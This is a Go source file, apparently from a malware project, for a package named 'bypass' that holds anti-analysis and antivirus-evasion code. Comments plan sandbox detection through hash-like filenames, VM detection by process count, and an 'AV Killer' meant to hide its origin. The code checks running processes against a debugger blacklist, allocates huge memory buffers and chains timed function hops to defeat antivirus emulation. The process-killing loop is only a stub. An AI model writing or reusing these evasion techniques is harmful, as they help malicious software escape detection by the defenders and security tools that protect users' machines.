//Work on Active Scanning (use channels )

//Macro Analysis
//The first in the series of new checks in the macro looks at the Microsoft Word filename itself.
//It checks whether the filename contains only hexadecimal characters (from the set of “0123456789ABCDEFabcdef”) before the extension, and if it does, the macro does not proceed to infect the victim.
//This is a common occurrence with files submitted to sandboxes, which often use SHA256 or MD5 hash as the filename, which only contain hexadecimal characters.
//If any other characters, such as other letters after “f”, underscores, or spaces are present, this check succeeds and the macro continues.
//In addition, filenames need to have a “.”, followed by any extension.

//Check for number of running processes (Less then 50 = VM?)

//AV Killer to make a clone and run with command, ask for Admin if needed
//AV Killer must use seperate process to prevent any AV from knowing who really did it.

//ReWork Memory Allocation to Random

package bypass

import (
	"bytes"
	"math/rand"
	"time"

	"github.com/StackExchange/wmi"
	"github.com/whiterabb17/gryphon/variables"
)

var magicNumber int64 = 0

func checkForProc(proc string) bool {
	var dst []variables.Win32_Process
	q := wmi.CreateQuery(&dst, "")
	err := wmi.Query(q, &dst)
	if err != nil {
		return false
	}
	for _, v := range dst {
		if bytes.Contains([]byte(v.Name), []byte(proc)) {
			return true
		}
	}
	return false
}

func RandInt(min int, max int) int {
	rand.Seed(time.Now().UTC().UnixNano())
	return min + rand.Intn(max-min)
}

func detectDebugProc() bool { //Process Detection
	for i := 0; i < len(variables.DebugBlacklist); i++ {
		if checkForProc(variables.DebugBlacklist[i]) {
			return true
		}
	}
	return false
}

// ============================================================
//
//	Anti-Process
//
// ============================================================
func AntiProc() {
	for {
		time.Sleep(time.Duration(RandInt(500, 1000)) * time.Millisecond)
		//Scan for Blacklisted Proc
		//Ig found attempt to kill it
	}
}

// ============================================================
//
//	Anti-Virus Bypass
//
// ============================================================
func bypassAV() {
	allocateMemory()
	jump()
}

func allocateMemory() {
	for i := 0; i < 1000; i++ {
		var Size int = 30000000
		Buffer_1 := make([]byte, Size)
		Buffer_1[0] = 1
		var Buffer_2 [102400000]byte
		Buffer_2[0] = 0
	}
}

func jump() {
	magicNumber++
	hop1()
}

func hop1() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop2()
}
func hop2() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop3()
}
func hop3() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop4()
}
func hop4() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop5()
}
func hop5() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop6()
}
func hop6() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop7()
}
func hop7() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop8()
}
func hop8() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop9()
}
func hop9() {
	magicNumber++
	time.Sleep(time.Duration(RandInt(100, 250)) * time.Nanosecond)
	hop10()
}
func hop10() {
	magicNumber++
}
